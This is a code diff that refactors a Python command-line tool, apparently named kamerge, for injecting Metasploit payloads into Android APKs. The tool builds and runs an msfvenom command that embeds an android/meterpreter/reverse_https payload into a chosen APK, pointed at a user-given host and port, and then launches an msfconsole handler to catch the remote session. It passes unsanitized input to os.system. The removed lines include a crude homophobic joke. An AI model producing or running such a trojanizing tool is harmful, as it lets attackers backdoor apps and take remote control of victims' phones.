@@ -1,8 +1,15 @@
-import os
-import readline
-from rich import print
-    
+"""
+kamerge.py - APK payload injector and Metasploit handler launcher
+Author: [Your Name]
+Description: Command-line tool to inject Metasploit payloads into APKs and automate handler setup.
+"""
 
+# === Imports ===
+import os  # For running shell commands
+import readline  # For enhanced input (history, etc.)
+from rich import print  # For colored terminal output
+
+# === Banner and Menus ===
 banner = """[red]
 ██╗  ██╗ █████╗ ███╗   ███╗███████╗██████╗  ██████╗ ███████╗
 ██║ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██╗██╔════╝ ██╔════╝
@@ -18,102 +25,89 @@ banner = """[red]
 6F 6E 20 6C 65 67 61 6C 20 70 75 72 70 6F 73 65 
 73 20 0A 49 27 6D 20 6E 6F 74 20 67 61 79 61 20
 """
+
 menu_1 = """    
-1. inject a metasploit framework payload into an apk with a metasploit session
-2. number 1 but witout a session
-3. just session
--3923232134234234. secret
-4. merge to apks into one (Not implemented yet)
-5. exit
+1. Inject a Metasploit framework payload into an APK with a Metasploit session
+2. More help
+0. Exit
 """
 
+menu_2 = """
+[green]To run this tool you will need:[/green]
+1. apktool
+2. apksigner
+3. zipalign
+4. metasploit framework
+5. (Optional) Other dependencies
+"""
 
-class apkmerger:
-    def __init__(self , apk1, apk2):
-        pass
-    def copy(self):
-        pass
-    def decompile(self):
-        pass
-    def scan(self):
-        pass
-    def merge(self):
-        pass
-    def recompile(self):
-        pass
-    def export(self):
-        pass
-
-
-
+# === Utility Functions ===
 def yesorno():
+    """Prompt user for a yes/no answer. Returns True for yes, False for no."""
     while True:
-        user_input = input("(y/n) : ")
-        user_input = user_input.lower()
-        if user_input == "y" or user_input == "yes":
+        user_input = input("(y/n) : ").strip().lower()
+        if user_input in ("y", "yes"):
             return True
-        elif user_input == "n" or user_input == "no":
+        elif user_input in ("n", "no"):
             return False
         else:
             print("Invalid input, please enter 'y' or 'n'.")
 
-
-def hinput(value_arry):#:)
+def hinput(value_array):
+    """Prompt user for a set of values, confirm, and return as a dict."""
     result = {}
-    running = True
-    while running:
-        # takeing input
-        for item in value_arry:
-            result[str(item)] = input(f"set {str(item)} to : ")
-        # checking if input is correct
-        for item in value_arry:
-            print(f"{item} is set to {result[str(item)]}")
-        print("[yellow]* are you sure[/yellow]")
-        user_conf = yesorno()
-        if user_conf:
-            running = False
+    while True:
+        # Collect input for each required value
+        for item in value_array:
+            result[item] = input(f"Set {item}: ")
+        # Show summary and confirm
+        for item in value_array:
+            print(f"{item} is set to {result[item]}")
+        print("[yellow]* Are you sure?[/yellow]")
+        if yesorno():
+            break
         else:
             print("[red]Please re-enter the values.[/red]")
     return result
 
-
+# === Main Application Logic ===
 def main():
+    """Main menu loop for kamerge tool."""
     print(banner)
     running = True
     while running:
         print(menu_1)
-        choice = input("Enter your choice (default is 1 ): ")
+        choice = input("Enter your choice (default is 1): ").strip()
         if choice == "1" or choice == "":
-            print("Injecting a metasploit framework payload into an apk with a metasploit session")
-            # Implement the logic for this option
-            options = ["ip addr" , "port" , "apk" , "output name"]
+            print("Injecting a Metasploit framework payload into an APK with a Metasploit session")
+            # Gather required options from user
+            options = ["ip addr", "port", "apk", "output name"]
             user_input = hinput(options)
-            command = f"msfvenom -x {user_input['apk']} -p android/meterpreter/reverse_https -a dalvik --platform android lhost={user_input['ip addr']} lport={user_input['port']} -o {user_input['output name']}.apk"
+            # Build msfvenom command
+            command = (
+                f"msfvenom -x {user_input['apk']} -p android/meterpreter/reverse_https "
+                f"-a dalvik --platform android lhost={user_input['ip addr']} lport={user_input['port']} "
+                f"-o {user_input['output name']}.apk"
+            )
             print(f"[green]Running command: {command}[/green]")
             os.system(command)
-            # now starting the msfconsole
-            print("[yellow]Starting msfconsole...?[/yellow]")
-
-            os.system(f"msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_https; set LHOST {user_input['ip addr']}; set LPORT {user_input['port']}; exploit'")
-
+            # Optionally start msfconsole handler
+            print("[yellow]Start msfconsole handler?[/yellow]")
+            if yesorno():
+                handler_cmd = (
+                    f"msfconsole -q -x 'use exploit/multi/handler; "
+                    f"set payload android/meterpreter/reverse_https; "
+                    f"set LHOST {user_input['ip addr']}; set LPORT {user_input['port']}; exploit'"
+                )
+                os.system(handler_cmd)
         elif choice == "2":
-            print("Injecting a metasploit framework payload into an apk without a session")
-            # Implement the logic for this option
-        elif choice == "3":
-            print("Just session")
-            # Implement the logic for this option
-        elif choice == "-3923232134234234":
-            print("Secret option selected")
-            print("[red]You ARE GAY[/red]")
-            # Implement the secret logic here
-        elif choice == "4":
-            print("Merging two apks into one (Not implemented yet)")
-            # Implement the logic for merging apks
-        elif choice == "5":
+            print(menu_2)
+        elif choice == "0":
             print("Exiting...")
             running = False
         else:
             print("Invalid choice, please try again.")
 
+# === Entry Point ===
 if __name__ == "__main__":
     main()
